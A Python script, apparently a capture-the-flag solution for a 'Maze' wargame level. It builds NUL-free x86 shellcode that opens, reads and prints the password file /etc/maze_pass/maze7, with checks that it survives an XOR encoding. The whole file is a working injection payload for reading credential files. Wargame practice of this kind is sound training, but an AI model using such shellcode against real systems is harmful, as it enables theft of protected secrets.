#!/usr/bin/env python3
"""Maze L6 shellcode: open/read/write /etc/maze_pass/maze7 (NUL-free, no '*').

Path built on the stack via pushes (NUL via a pre-push of eax); read into a
buffer allocated below the strings (sub esp); written to fd 1; exit.
Avoids NUL and '*' (0x2a) in every byte (argv[2] must be NUL-free, and a raw
0x2a would become NUL in argv[2] via the frob encoding).
"""
import sys

sc = bytes([
    0x31, 0xC0,                       # xor eax, eax
    0x50,                             # push eax            (NUL terminator for path)
    0x68, 0x61, 0x7A, 0x65, 0x37,     # push "aze7"
    0x68, 0x73, 0x73, 0x2F, 0x6D,     # push "ss/m"
    0x68, 0x65, 0x5F, 0x70, 0x61,     # push "e_pa"
    0x68, 0x2F, 0x6D, 0x61, 0x7A,     # push "/maz"
    0x68, 0x2F, 0x65, 0x74, 0x63,     # push "/etc"
    0x89, 0xE3,                       # mov ebx, esp        (path)
    0x31, 0xC9,                       # xor ecx, ecx        (O_RDONLY)
    0xB0, 0x05,                       # mov al, 5           (open)
    0xCD, 0x80,                       # int 0x80
    0x89, 0xC3,                       # mov ebx, eax        (fd)
    0x83, 0xEC, 0x20,                 # sub esp, 0x20       (buffer)
    0x89, 0xE1,                       # mov ecx, esp        (buf)
    0x31, 0xD2,                       # xor edx, edx
    0xB2, 0x0F,                       # mov dl, 15          (count)
    0xB0, 0x03,                       # mov al, 3           (read)
    0xCD, 0x80,                       # int 0x80
    0x31, 0xDB,                       # xor ebx, ebx
    0xB3, 0x01,                       # mov bl, 1           (fd 1)
    0x89, 0xE1,                       # mov ecx, esp        (buf)
    0x89, 0xC2,                       # mov edx, eax        (nread)
    0xB0, 0x04,                       # mov al, 4           (write)
    0xCD, 0x80,                       # int 0x80
    0x31, 0xDB,                       # xor ebx, ebx
    0xB0, 0x01,                       # mov al, 1           (exit)
    0xCD, 0x80,                       # int 0x80
])

if __name__ == "__main__":
    bad = set(b"\x00\x2a")
    assert not (bad & set(sc)), [hex(b) for b in sc if b in bad]
    assert 0 not in bytes(b ^ 42 for b in sc), "frobbed sc has NUL"
    sys.stdout.buffer.write(sc)
